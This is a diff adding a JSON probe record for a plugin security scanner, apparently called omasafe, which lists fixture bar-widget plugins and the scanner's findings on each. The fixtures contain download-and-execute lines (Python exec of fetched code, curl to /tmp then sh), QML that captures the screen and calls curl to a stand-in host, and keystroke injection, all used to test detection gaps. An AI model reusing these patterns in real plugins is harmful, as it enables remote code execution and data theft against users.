@@ -1,0 +1,247 @@
+{
+  "schema": "omasafe.architecture-review-probes.v1",
+  "reviewed_commit": "92ed9c635aace1b332074060c0881ab6e67d957e",
+  "tool_version": "0.2.3",
+  "build_command": "cargo build -p omasafe-cli --offline",
+  "qml_parser_feature": true,
+  "scan_argv": [
+    "target/debug/omasafe-cli",
+    "scan-plugin",
+    "--path",
+    "FIXTURE_DIRECTORY",
+    "--format",
+    "json"
+  ],
+  "execution_note": "Only the scanner was run. Fixture code was never executed, imported, installed, or enabled. Each scan used isolated XDG configuration, state, and cache directories. Observations are a selected report subset, not corrected expectations or complete reports.",
+  "policy_identity": {
+    "analyzer_version": "0.2.3",
+    "equivalence_map_version": "omarchy-marketplace-baseline-v3/2",
+    "limits_fingerprint": "9476a8cafcc424de205d531cf4a329648fc53557853960bedb094702188cf0ba",
+    "parser_versions": {
+      "qml": "tree-sitter-qmljs/0.3.1"
+    },
+    "rule_catalog_fingerprint": "c3e595d6bbb29551fc5cec1e088c8587c8499b3b7a74abda778491e8fe58be41",
+    "rule_catalog_version": 7,
+    "severity_table_version": 1,
+    "supported_surface_version": "omarchy-security-surface.v1"
+  },
+  "probes": [
+    {
+      "id": "python-unrelated",
+      "files": {
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.python-unrelated\", \"kinds\": [\"bar-widget\"]}",
+        "payload.py": "import requests, subprocess\nrequests.get(\"https://example.invalid/status\"); subprocess.run([\"date\"])\n"
+      },
+      "observed": {
+        "findings": [
+          {
+            "rule_id": "oma.python.download-execute",
+            "confidence": "lexical-fallback",
+            "evidence": "download-execute"
+          }
+        ],
+        "analysis_coverage_limitations": [],
+        "payload_coverage_states": {
+          "analyzed": 0,
+          "partial": 1,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "python-multiline",
+      "files": {
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.python-multiline\", \"kinds\": [\"bar-widget\"]}",
+        "payload.py": "import requests\npayload = requests.get(\"https://example.invalid/code\").text\nexec(payload)\n"
+      },
+      "observed": {
+        "findings": [],
+        "analysis_coverage_limitations": [],
+        "payload_coverage_states": {
+          "analyzed": 0,
+          "partial": 1,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "python-inline",
+      "files": {
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.python-inline\", \"kinds\": [\"bar-widget\"]}",
+        "payload.py": "import requests\nexec(requests.get(\"https://example.invalid/code\").text)\n"
+      },
+      "observed": {
+        "findings": [
+          {
+            "rule_id": "oma.python.download-execute",
+            "confidence": "lexical-fallback",
+            "evidence": "download-execute"
+          }
+        ],
+        "analysis_coverage_limitations": [],
+        "payload_coverage_states": {
+          "analyzed": 0,
+          "partial": 1,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "shell-stage-no-chmod",
+      "files": {
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.shell-stage-no-chmod\", \"kinds\": [\"bar-widget\"]}",
+        "payload.sh": "#!/bin/sh\ncurl -o /tmp/omasafe-review-stage.sh https://example.invalid/code\nsh /tmp/omasafe-review-stage.sh\n"
+      },
+      "observed": {
+        "findings": [],
+        "analysis_coverage_limitations": [
+          "sink-reference-rejected:absolute:payload.sh:3:/tmp/omasafe-review-stage.sh"
+        ],
+        "payload_coverage_states": {
+          "analyzed": 0,
+          "partial": 1,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "shell-stage-chmod",
+      "files": {
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.shell-stage-chmod\", \"kinds\": [\"bar-widget\"]}",
+        "payload.sh": "#!/bin/sh\ncurl -o /tmp/omasafe-review-stage.sh https://example.invalid/code\nchmod +x /tmp/omasafe-review-stage.sh\nsh /tmp/omasafe-review-stage.sh\n"
+      },
+      "observed": {
+        "findings": [
+          {
+            "rule_id": "oma.script.download-execute",
+            "confidence": "lexical-fallback",
+            "evidence": "staged-download-execute:/tmp/omasafe-review-stage.sh:fetched-line-2"
+          }
+        ],
+        "analysis_coverage_limitations": [
+          "sink-reference-rejected:absolute:payload.sh:4:/tmp/omasafe-review-stage.sh"
+        ],
+        "payload_coverage_states": {
+          "analyzed": 0,
+          "partial": 1,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "qml-click-capture",
+      "files": {
+        "main.qml": "import QtQuick\nimport Quickshell\nItem {\n MouseArea {\n  onClicked: {\n   Quickshell.execDetached([\"sh\", \"-c\", \"grim /tmp/capture.png; curl https://example.invalid/status\"]);\n  }\n }\n}\n",
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.qml-click-capture\", \"kinds\": [\"bar-widget\"]}"
+      },
+      "observed": {
+        "findings": [
+          {
+            "rule_id": "oma.qml.detached-execution",
+            "confidence": "ast-backed",
+            "evidence": "shell-interpreter-command:sh -c grim /tmp/capture.png; curl https://example.invalid/status"
+          }
+        ],
+        "analysis_coverage_limitations": [
+          "sink-reference-rejected:missing-local-target:main.qml:6:grim /tmp/capture.png; curl https://example.invalid/status"
+        ],
+        "payload_coverage_states": {
+          "analyzed": 1,
+          "partial": 0,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "qml-click-capture-control",
+      "files": {
+        "main.qml": "import QtQuick\nimport Quickshell\nItem {\n MouseArea {\n  onClicked: {\n   Quickshell.execDetached([\"grim\", \"/tmp/capture.png\"]);\n  }\n }\n}\n",
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.qml-click-capture-control\", \"kinds\": [\"bar-widget\"]}"
+      },
+      "observed": {
+        "findings": [],
+        "analysis_coverage_limitations": [
+          "sink-reference-rejected:absolute:main.qml:6:/tmp/capture.png"
+        ],
+        "payload_coverage_states": {
+          "analyzed": 1,
+          "partial": 0,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "qml-click-capture-xhr",
+      "files": {
+        "main.qml": "import QtQuick\nimport Quickshell\nItem {\n property string userInput: \"hello\"\n MouseArea {\n  onClicked: {\n   Quickshell.execDetached([\"grim\", \"/tmp/capture.png\"]); var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"https://example.invalid/status\"); xhr.send();\n  }\n }\n}\n",
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.qml-click-capture-xhr\", \"kinds\": [\"bar-widget\"]}"
+      },
+      "observed": {
+        "findings": [
+          {
+            "rule_id": "oma.qml.screen-capture-background",
+            "confidence": "ast-backed",
+            "evidence": "background-screen-capture"
+          }
+        ],
+        "analysis_coverage_limitations": [
+          "sink-reference-rejected:absolute:main.qml:7:/tmp/capture.png"
+        ],
+        "payload_coverage_states": {
+          "analyzed": 1,
+          "partial": 0,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    },
+    {
+      "id": "qml-click-input",
+      "files": {
+        "main.qml": "import QtQuick\nimport Quickshell\nItem {\n property string userInput: \"hello\"\n MouseArea {\n  onClicked: {\n   Quickshell.execDetached([\"wtype\", userInput]);\n  }\n }\n}\n",
+        "manifest.json": "{\"schemaVersion\": 1, \"id\": \"io.omasafe.review.qml-click-input\", \"kinds\": [\"bar-widget\"]}"
+      },
+      "observed": {
+        "findings": [
+          {
+            "rule_id": "oma.qml.input-injection-background",
+            "confidence": "ast-backed",
+            "evidence": "background-input-injection"
+          }
+        ],
+        "analysis_coverage_limitations": [],
+        "payload_coverage_states": {
+          "analyzed": 1,
+          "partial": 0,
+          "skipped": 0,
+          "truncated": 0,
+          "unreferenced": 0,
+          "unsupported": 1
+        }
+      }
+    }
+  ]
+}
